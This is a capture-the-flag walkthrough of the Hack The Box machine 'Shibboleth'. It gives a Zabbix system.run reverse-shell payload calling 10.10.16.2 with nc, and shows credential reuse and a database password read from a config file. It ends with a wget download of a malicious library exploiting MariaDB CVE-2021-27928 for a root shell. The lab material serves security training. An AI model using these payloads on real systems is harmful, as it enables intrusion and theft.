Administrator:ilovepumkinpie1

Let's make a revshell;

On the Zabbix portal, got to: Configuration > Hosts > Item > Create Item

Name it whatever you want and paste this payload in the key:

`system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.2 4141 >/tmp/f &,nowait]`

start a listener before clicking on test and sending the payload

```
┌──(kali㉿kali)-[/media/…/HTB/Boxes/Active Boxes/Shibboleth]
└─$ sudo nc -lvnp 4141                 
[sudo] password for kali: 
Listening on 0.0.0.0 4141
Connection received on 10.10.11.124 52064
/bin/sh: 0: can't access tty; job control turned off
$ whoami
zabbix
```

Get a full TTY:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Login to ipmi-svc (user)

```
zabbix@shibboleth:/home/ipmi-svc$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
zabbix@shibboleth:/home/ipmi-svc$ su ipmi-svc
su ipmi-svc
Password: ilovepumkinpie1
```

Our first [[Flags]]

Now to look around for another entry way..
We know that it's running a database so let's look through and see if we can find a password

```
ipmi-svc@shibboleth:/etc/zabbix$ ls
ls
peeesskay.psk       zabbix_agentd.conf.dpkg-dist  zabbix_server.conf.dpkg-dist
web                 zabbix_agentd.d
zabbix_agentd.conf  zabbix_server.conf
```

```
ipmi-svc@shibboleth:/etc/zabbix$        grep -v "^[#;]" /etc/zabbix/zabbix_server.conf | grep -v "^$"
<[#;]" /etc/zabbix/zabbix_server.conf | grep -v "^$"
LogFile=/var/log/zabbix/zabbix_server.log
LogFileSize=0
PidFile=/run/zabbix/zabbix_server.pid
SocketDir=/run/zabbix
DBName=zabbix
DBUser=zabbix
DBPassword=bloooarskybluh
SNMPTrapperFile=/var/log/snmptrap/snmptrap.log
Timeout=4
AlertScriptsPath=/usr/lib/zabbix/alertscripts
ExternalScripts=/usr/lib/zabbix/externalscripts
FpingLocation=/usr/bin/fping
Fping6Location=/usr/bin/fping6
LogSlowQueries=3000
StatsAllowedIP=127.0.0.1
```

zabbix:bloooarskybluh
IP: localhost

``mysql -h 127.0.0.1 -D zabbix -u zabbix -p'bloooarskybluh'``

`MariaDB [zabbix]> SELECT VERSION();
SELECT VERSION();
+----------------------------------+
| VERSION()                        |
+----------------------------------+
| 10.3.25-MariaDB-0ubuntu0.20.04.1 |
+----------------------------------+
`

Payload: https://github.com/Al1ex/CVE-2021-27928
*putting the payload in tmp*
``cd /tmp ; wget http://10.10.16.2/CVE-2021-27928.so``
connect to the db
`mysql -h 127.0.0.1 -D zabbix -u zabbix -p'bloooarskybluh'`
calling the revshell:
`SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";`
get the [[Flags]]